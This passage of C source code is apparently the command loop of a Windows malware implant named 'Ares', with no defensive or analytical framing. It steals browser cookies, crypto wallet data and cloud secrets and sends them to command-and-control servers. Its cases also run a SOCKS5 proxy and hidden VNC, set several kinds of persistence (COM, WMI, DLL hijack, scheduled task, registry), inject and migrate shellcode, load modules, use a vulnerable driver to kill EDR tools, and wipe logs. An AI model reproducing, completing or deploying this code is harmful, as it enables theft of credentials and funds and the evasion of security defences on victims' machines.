                            off += json_write_str(output+off, bufMax-off, "value", tc[i].value);
                            off += snprintf(output+off, bufMax-off, ",");
                            off += json_write_str(output+off, bufMax-off, "path", tc[i].path);
                            off += snprintf(output+off, bufMax-off, ",\"secure\":%d,\"httponly\":%d}",
                                tc[i].secure, tc[i].httponly);
                        }
                        off += snprintf(output+off, bufMax-off, "]}");
                        { char _te[24]; DEC_EXFIL_TYPE_COOKIE(_te); c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, _te, output, off); }
                    }
                    HeapFree(GetProcessHeap(), 0, tc);

                    /* Also steal wallets — send actual data */
                    STOLEN_WALLET wallets[50];
                    int wn = Ares_StealWallets(wallets, 50);
                    if (wn > 0) {
                        /* Send each wallet separately (base64 data can be large) */
                        for (int i = 0; i < wn; i++) {
                            /* Base64 encode wallet LevelDB data */
                            int b64_max = ((wallets[i].data_len + 2) / 3) * 4 + 1;
                            char* b64_buf = (char*)HeapAlloc(GetProcessHeap(), 0, b64_max);
                            if (!b64_buf) continue;
                            int b64_len = base64_encode(wallets[i].data, wallets[i].data_len, b64_buf, b64_max);

                            int off = 0;
                            char _tw[24]; DEC_EXFIL_TYPE_WALLET(_tw);
                            char _kb[8]; DEC_EXFIL_KEY_BOTID(_kb);
                            char _kt[8]; DEC_EXFIL_KEY_TYPE(_kt);
                            off += snprintf(output+off, bufMax-off, "{\"%s\":\"%s\",\"%s\":\"%s\",", _kb, bot_id, _kt, _tw);
                            off += json_write_str(output+off, bufMax-off, "ext", wallets[i].extension_name);
                            off += snprintf(output+off, bufMax-off, ",");
                            off += json_write_str(output+off, bufMax-off, "browser", wallets[i].browser);
                            off += snprintf(output+off, bufMax-off, ",\"data_len\":%d,\"data\":\"", wallets[i].data_len);
                            /* Append base64 directly (no escape needed — it's safe chars) */
                            if (off + b64_len < bufMax - 4) {
                                memcpy(output + off, b64_buf, b64_len);
                                off += b64_len;
                            }
                            off += snprintf(output+off, bufMax-off, "\"}");
                            { char _te[24]; DEC_EXFIL_TYPE_WALLET(_te); c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, _te, output, off); }
                            HeapFree(GetProcessHeap(), 0, b64_buf);
                        }
                    }
                    send_task_result(state.config.c2_endpoints[0], c2_port, bot_id, TASK_STEAL_TOKENS, TRUE, "ok");
                    break;
                }

                case TASK_STEAL_CLOUD:
                    len = steal_cloud_secrets(output, bufMax);
                    if (len > 50) c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, "cloud", output, len);
                    break;

                /* ── Network modules (v3.5: capability isolation with fallback) ── */
                case TASK_SOCKS5_START:
                    /* v3.5: Try isolated capability first, fallback to in-process.
                     * Pass NULL dll_data — when capability DLLs are built separately,
                     * they'll be fetched from C2 and passed here. */
                    if (!Ares_LoadCapability(&state, CAP_SOCKS5, NULL, 0)) {
                        /* No capability DLL available — run in-process (legacy) */
                        Ares_Socks5_Start(&state, state.config.c2_endpoints[0], socks5_port);
                    }
                    send_task_result(state.config.c2_endpoints[0], c2_port, bot_id, TASK_SOCKS5_START, TRUE, "started");
                    break;
                case TASK_SOCKS5_STOP:
                    Ares_UnloadCapability(CAP_SOCKS5);
                    Ares_Socks5_Stop();
                    send_task_result(state.config.c2_endpoints[0], c2_port, bot_id, TASK_SOCKS5_STOP, TRUE, "stopped");
                    break;
                case TASK_HVNC_START:
                    if (!Ares_LoadCapability(&state, CAP_HVNC, NULL, 0)) {
                        Ares_HVNC_Start(&state);
                    }
                    send_task_result(state.config.c2_endpoints[0], c2_port, bot_id, TASK_HVNC_START, TRUE, "started");
                    break;
                case TASK_HVNC_STOP:
                    Ares_UnloadCapability(CAP_HVNC);
                    Ares_HVNC_Stop();
                    send_task_result(state.config.c2_endpoints[0], c2_port, bot_id, TASK_HVNC_STOP, TRUE, "stopped");
                    break;

                /* ── Persistence ── */
                case TASK_PERSIST: {
                    char method[32] = {0};
                    JSON_EXTRACT_ARG(typeStr, 0, method, sizeof(method));
                    if (strcmp(method, "com") == 0) Ares_Persist_COMHijack(&state);
                    else if (strcmp(method, "wmi") == 0) Ares_Persist_WMI(&state);
                    else if (strcmp(method, "dll") == 0) Ares_Persist_DLLHijack(&state);
                    else if (strcmp(method, "schtask") == 0) Ares_Persist_ScheduledTask(&state);
                    else if (strcmp(method, "reg") == 0) Ares_Persist_RegistryRun(&state);
                    else { /* all */
                        Ares_Persist_COMHijack(&state);
                        Ares_Persist_ScheduledTask(&state);
                        Ares_Persist_RegistryRun(&state);
                    }
                    break;
                }

                /* ── Inject: parse target + b64 shellcode from args ── */
                case TASK_INJECT: {
                    char target[128] = {0};
                    char sc_b64[65536] = {0};
                    JSON_EXTRACT_ARG(typeStr, 0, target, sizeof(target));
                    JSON_EXTRACT_ARG(typeStr, 1, sc_b64, sizeof(sc_b64));
                    if (target[0] && sc_b64[0]) {
                        BYTE sc_buf[32768];
                        DWORD sc_len = sizeof(sc_buf);
                        if (_resolve_crypt32() && p_CryptStringToBinaryA(sc_b64, 0, CRYPT_STRING_BASE64, sc_buf, &sc_len, NULL, NULL)) {
                            /* v3.5: Threadless first — no NtCreateThreadEx kernel callback */
                            BOOL inj = Ares_Inject_Threadless(&state, target, sc_buf, sc_len);
                            if (!inj) Ares_Inject_RemoteThread(&state, target, sc_buf, sc_len);
                        }
                    }
                    break;
                }

                /* ── Migrate ── */
                case TASK_MIGRATE: {
                    char target[128] = "svchost.exe";
                    char sc_b64[65536] = {0};
                    JSON_EXTRACT_ARG(typeStr, 0, target, sizeof(target));
                    JSON_EXTRACT_ARG(typeStr, 1, sc_b64, sizeof(sc_b64));
                    if (sc_b64[0]) {
                        BYTE sc_buf[32768];
                        DWORD sc_len = sizeof(sc_buf);
                        if (_resolve_crypt32() && p_CryptStringToBinaryA(sc_b64, 0, CRYPT_STRING_BASE64, sc_buf, &sc_len, NULL, NULL))
                            Ares_Migrate(&state, target, sc_buf, sc_len);
                    }
                    break;
                }

                /* ── BOF Loader ── */
                case TASK_LOAD_MODULE: {
                    char bof_b64[131072] = {0};
                    char bof_args[4096] = {0};
                    JSON_EXTRACT_ARG(typeStr, 0, bof_b64, sizeof(bof_b64));
                    JSON_EXTRACT_ARG(typeStr, 1, bof_args, sizeof(bof_args));
                    if (bof_b64[0]) {
                        BYTE bof_buf[65536];
                        DWORD bof_len = sizeof(bof_buf);
                        if (_resolve_crypt32() && p_CryptStringToBinaryA(bof_b64, 0, CRYPT_STRING_BASE64, bof_buf, &bof_len, NULL, NULL)) {
                            char bof_output[65536];
                            int out_len = Ares_BOF_Execute(bof_buf, bof_len, bof_args, (int)strlen(bof_args), bof_output, sizeof(bof_output));
                            if (out_len > 0)
                                c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, "bof_result", bof_output, out_len);
                        }
                    }
                    break;
                }

                /* ── BYOVD ── */
                case TASK_BYOVD_LOAD: {
                    char driver[MAX_PATH] = {0};
                    JSON_EXTRACT_ARG(typeStr, 0, driver, sizeof(driver));
                    if (driver[0]) {
                        BOOL ok = Ares_BYOVD_LoadDriver(driver);
                        if (ok) {
                            /* Try to kill all EDR */
                            int killed = Ares_KillAllEDR();
                            int off = snprintf(output, bufMax, "{\"bot_id\":\"%s\",\"byovd\":\"loaded\",\"edr_killed\":%d}", bot_id, killed);
                            c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, "byovd", output, off);
                        }
                    }
                    break;
                }

                case TASK_UNHOOK:
                    /* v3.0: Removed — agent uses clean ntdll SSN resolution at init.
                     * Unhooking/patching is noisy and unnecessary. */
                    break;

                case TASK_SELFDESTRUCT:
                    Ares_Socks5_Stop();
                    Ares_HVNC_Stop();
                    Ares_Persist_Cleanup();
                    /* v3.2: Anti-forensics — wipe logs before self-destruct */
                    Ares_WipeLogs();
                    HeapFree(GetProcessHeap(), 0, output);
                    if (resp.body) HeapFree(GetProcessHeap(), 0, resp.body);
                    Ares_SelfDestruct(&state);
                    return 0;

                case TASK_SLEEP: {
                    char ms[16] = {0};
                    JSON_EXTRACT_ARG(typeStr, 0, ms, sizeof(ms));
                    if (ms[0]) state.config.sleep_ms = (DWORD)atoi(ms);
                    break;
                }

                default:
                    break;
                }

                taskSearch = typeStr + 7;
            }

            HeapFree(GetProcessHeap(), 0, resp.body);
        }

        beacon_sleep:
        /* v3.5: Sleep with memory obfuscation — .rdata/.data encrypted during sleep.
         * .text is NOT encrypted (would destroy executing code).
         * Jitter: convert integer percentage → fraction (20 → 0.20) */
        Ares_SleepObfuscated(state.config.sleep_ms, (double)jitter_pct / 100.0);
    }

    HeapFree(GetProcessHeap(), 0, output);
    Ares_SelfDestruct(&state);
    return 0;
}

